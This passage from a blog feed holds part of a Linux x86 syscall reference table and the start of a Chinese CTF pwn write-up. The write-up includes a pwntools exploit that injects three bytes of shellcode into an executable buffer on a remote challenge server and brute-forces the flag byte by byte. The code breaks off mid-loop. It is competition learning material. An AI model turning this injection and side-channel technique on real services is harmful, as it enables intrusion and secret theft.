href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L1338" target="_blank" rel="noopener">security/keys/keyctl.c:1338</a></td></tr><tr><td>289</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html" target="_blank" rel="noopener">sys_ioprio_set</a></td><td>0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L76" target="_blank" rel="noopener">fs/ioprio.c:76</a></td></tr><tr><td>290</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html" target="_blank" rel="noopener">sys_ioprio_get</a></td><td>0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L192" target="_blank" rel="noopener">fs/ioprio.c:192</a></td></tr><tr><td>291</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html" target="_blank" rel="noopener">sys_inotify_init</a></td><td>0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L680" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:680</a></td></tr><tr><td>292</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html" target="_blank" rel="noopener">sys_inotify_add_watch</a></td><td>0x124</td><td>int fd</td><td>const char __user *path</td><td>u32 mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L685" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:685</a></td></tr><tr><td>293</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html" target="_blank" rel="noopener">sys_inotify_rm_watch</a></td><td>0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L726" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:726</a></td></tr><tr><td>294</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html" target="_blank" rel="noopener">sys_migrate_pages</a></td><td>0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long __user *from</td><td>const unsigned long __user *to</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1273" target="_blank" rel="noopener">mm/mempolicy.c:1273</a></td></tr><tr><td>295</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html" target="_blank" rel="noopener">sys_openat</a></td><td>0x127</td><td>int dfd</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L913" target="_blank" rel="noopener">fs/open.c:913</a></td></tr><tr><td>296</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html" target="_blank" rel="noopener">sys_mkdirat</a></td><td>0x128</td><td>int dfd</td><td>const char __user * pathname</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2093" target="_blank" rel="noopener">fs/namei.c:2093</a></td></tr><tr><td>297</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html" target="_blank" rel="noopener">sys_mknodat</a></td><td>0x129</td><td>int dfd</td><td>const char __user * filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2012" target="_blank" rel="noopener">fs/namei.c:2012</a></td></tr><tr><td>298</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html" target="_blank" rel="noopener">sys_fchownat</a></td><td>0x12a</td><td>int dfd</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L558" target="_blank" rel="noopener">fs/open.c:558</a></td></tr><tr><td>299</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html" target="_blank" rel="noopener">sys_futimesat</a></td><td>0x12b</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/utimes.c:191</a></td></tr><tr><td>300</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatat64.2.html" target="_blank" rel="noopener">sys_fstatat64</a></td><td>0x12c</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>int flag</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L391" target="_blank" rel="noopener">fs/stat.c:391</a></td></tr><tr><td>301</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html" target="_blank" rel="noopener">sys_unlinkat</a></td><td>0x12d</td><td>int dfd</td><td>const char __user * pathname</td><td>int flag</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2341" target="_blank" rel="noopener">fs/namei.c:2341</a></td></tr><tr><td>302</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html" target="_blank" rel="noopener">sys_renameat</a></td><td>0x12e</td><td>int olddfd</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2671" target="_blank" rel="noopener">fs/namei.c:2671</a></td></tr><tr><td>303</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html" target="_blank" rel="noopener">sys_linkat</a></td><td>0x12f</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2470" target="_blank" rel="noopener">fs/namei.c:2470</a></td></tr><tr><td>304</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html" target="_blank" rel="noopener">sys_symlinkat</a></td><td>0x130</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2377" target="_blank" rel="noopener">fs/namei.c:2377</a></td></tr><tr><td>305</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html" target="_blank" rel="noopener">sys_readlinkat</a></td><td>0x131</td><td>int dfd</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L284" target="_blank" rel="noopener">fs/stat.c:284</a></td></tr><tr><td>306</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html" target="_blank" rel="noopener">sys_fchmodat</a></td><td>0x132</td><td>int dfd</td><td>const char __user * filename</td><td>mode_t mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L474" target="_blank" rel="noopener">fs/open.c:474</a></td></tr><tr><td>307</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html" target="_blank" rel="noopener">sys_faccessat</a></td><td>0x133</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L286" target="_blank" rel="noopener">fs/open.c:286</a></td></tr><tr><td>308</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html" target="_blank" rel="noopener">sys_pselect6</a></td><td>0x134</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L675" target="_blank" rel="noopener">fs/select.c:675</a></td></tr><tr><td>309</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html" target="_blank" rel="noopener">sys_ppoll</a></td><td>0x135</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="noopener">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tsp</a></td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L950" target="_blank" rel="noopener">fs/select.c:950</a></td></tr><tr><td>310</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html" target="_blank" rel="noopener">sys_unshare</a></td><td>0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L1624" target="_blank" rel="noopener">kernel/fork.c:1624</a></td></tr><tr><td>311</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html" target="_blank" rel="noopener">sys_set_robust_list</a></td><td>0x137</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="noopener">struct robust_list_head __user *head</a></td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2351" target="_blank" rel="noopener">kernel/futex.c:2351</a></td></tr><tr><td>312</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html" target="_blank" rel="noopener">sys_get_robust_list</a></td><td>0x138</td><td>int pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="noopener">struct robust_list_head __user * __user *head_ptr</a></td><td>size_t __user *len_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2373" target="_blank" rel="noopener">kernel/futex.c:2373</a></td></tr><tr><td>313</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html" target="_blank" rel="noopener">sys_splice</a></td><td>0x139</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1718" target="_blank" rel="noopener">fs/splice.c:1718</a></td></tr><tr><td>314</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html" target="_blank" rel="noopener">sys_sync_file_range</a></td><td>0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>315</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html" target="_blank" rel="noopener">sys_tee</a></td><td>0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L2061" target="_blank" rel="noopener">fs/splice.c:2061</a></td></tr><tr><td>316</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html" target="_blank" rel="noopener">sys_vmsplice</a></td><td>0x13c</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1692" target="_blank" rel="noopener">fs/splice.c:1692</a></td></tr><tr><td>317</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html" target="_blank" rel="noopener">sys_move_pages</a></td><td>0x13d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/migrate.c?v=2.6.35#L1075" target="_blank" rel="noopener">mm/migrate.c:1075</a></td></tr><tr><td>318</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html" target="_blank" rel="noopener">sys_getcpu</a></td><td>0x13e</td><td>unsigned __user *cpu</td><td>unsigned __user *node</td><td><a href="http://lxr.free-electrons.com/source/include/linux/getcpu.h?v=2.6.35#L14" target="_blank" rel="noopener">struct getcpu_cache __user *cache</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1621" target="_blank" rel="noopener">kernel/sys.c:1621</a></td></tr><tr><td>319</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html" target="_blank" rel="noopener">sys_epoll_pwait</a></td><td>0x13f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1373" target="_blank" rel="noopener">fs/eventpoll.c:1373</a></td></tr><tr><td>320</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html" target="_blank" rel="noopener">sys_utimensat</a></td><td>0x140</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *utimes</a></td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L173" target="_blank" rel="noopener">fs/utimes.c:173</a></td></tr><tr><td>321</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html" target="_blank" rel="noopener">sys_signalfd</a></td><td>0x141</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L265" target="_blank" rel="noopener">fs/signalfd.c:265</a></td></tr><tr><td>322</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html" target="_blank" rel="noopener">sys_timerfd_create</a></td><td>0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L164" target="_blank" rel="noopener">fs/timerfd.c:164</a></td></tr><tr><td>323</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html" target="_blank" rel="noopener">sys_eventfd</a></td><td>0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L434" target="_blank" rel="noopener">fs/eventfd.c:434</a></td></tr><tr><td>324</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html" target="_blank" rel="noopener">sys_fallocate</a></td><td>0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>325</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html" target="_blank" rel="noopener">sys_timerfd_settime</a></td><td>0x145</td><td>int ufd</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">const struct itimerspec __user *utmr</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *otmr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L194" target="_blank" rel="noopener">fs/timerfd.c:194</a></td></tr><tr><td>326</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html" target="_blank" rel="noopener">sys_timerfd_gettime</a></td><td>0x146</td><td>int ufd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *otmr</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L252" target="_blank" rel="noopener">fs/timerfd.c:252</a></td></tr><tr><td>327</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html" target="_blank" rel="noopener">sys_signalfd4</a></td><td>0x147</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L211" target="_blank" rel="noopener">fs/signalfd.c:211</a></td></tr><tr><td>328</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html" target="_blank" rel="noopener">sys_eventfd2</a></td><td>0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L409" target="_blank" rel="noopener">fs/eventfd.c:409</a></td></tr><tr><td>329</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html" target="_blank" rel="noopener">sys_epoll_create1</a></td><td>0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1187" target="_blank" rel="noopener">fs/eventpoll.c:1187</a></td></tr><tr><td>330</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html" target="_blank" rel="noopener">sys_dup3</a></td><td>0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L53" target="_blank" rel="noopener">fs/fcntl.c:53</a></td></tr><tr><td>331</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html" target="_blank" rel="noopener">sys_pipe2</a></td><td>0x14b</td><td>int __user *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1101" target="_blank" rel="noopener">fs/pipe.c:1101</a></td></tr><tr><td>332</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html" target="_blank" rel="noopener">sys_inotify_init1</a></td><td>0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L640" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:640</a></td></tr><tr><td>333</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html" target="_blank" rel="noopener">sys_preadv</a></td><td>0x14d</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L759" target="_blank" rel="noopener">fs/read_write.c:759</a></td></tr><tr><td>334</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html" target="_blank" rel="noopener">sys_pwritev</a></td><td>0x14e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L784" target="_blank" rel="noopener">fs/read_write.c:784</a></td></tr><tr><td>335</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html" target="_blank" rel="noopener">sys_rt_tgsigqueueinfo</a></td><td>0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2437" target="_blank" rel="noopener">kernel/signal.c:2437</a></td></tr><tr><td>336</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html" target="_blank" rel="noopener">sys_perf_event_open</a></td><td>0x150</td><td><a href="http://lxr.free-electrons.com/source/include/linux/perf_event.h?v=2.6.35#L166" target="_blank" rel="noopener">struct perf_event_attr __user *attr_uptr</a></td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/kernel/perf_event.c?v=2.6.35#L5065" target="_blank" rel="noopener">kernel/perf_event.c:5065</a></td></tr><tr><td>337</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html" target="_blank" rel="noopener">sys_recvmmsg</a></td><td>0x151</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/socket.h?v=2.6.35#L72" target="_blank" rel="noopener">struct mmsghdr __user *msg</a></td><td>unsigned int vlen</td><td>unsigned flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2168" target="_blank" rel="noopener">net/socket.c:2168</a></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;x64&quot;&gt;&lt;a href=&quot;#x64&quot; class=&quot;headerlink&quot; title=&quot;x64&quot;&gt;&lt;/a&gt;x64&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;%rax&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;Syst
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>红帽杯pwn wp</title>
    <link href="http://yoursite.com/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/"/>
    <id>http://yoursite.com/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/</id>
    <published>2019-11-11T14:18:51.000Z</published>
    <updated>2019-11-12T09:30:26.046Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>程序静态链接，真恶心，呕。</p><p>首先分析程序流</p><p>main</p><img src="/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png"><p>catflag</p><img src="/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png"><p>maby is good</p><img src="/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png"><p>give me</p><img src="/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png"><p>该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且可以往里面读3个字节，随后把这个mmap分配的内 存地址赋给一个函数指针，并且执行，在这里把它称为函数v3。</p><p>红箭头指的就是关键地址，我们可以直接分析该模块的汇编。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //这里就是mov eax, v3</span><br><span class="line">call eax  //这就是关键点，执行v3</span><br></pre></td></tr></table></figure><p>那么自然想到往里写入code，使得之后的赋值mov [ebp+var_10], eax （就是对v4赋值）中的eax可控。使得最后的比对可控，是我们控制的v4与flag中的数据进行比对，从而达到爆破的目的</p><p>贴上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    print(char)</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    print(info)</span><br><span class="line"></span><br><span class="line">​    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">​      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">​        flag += j</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">​        *<span 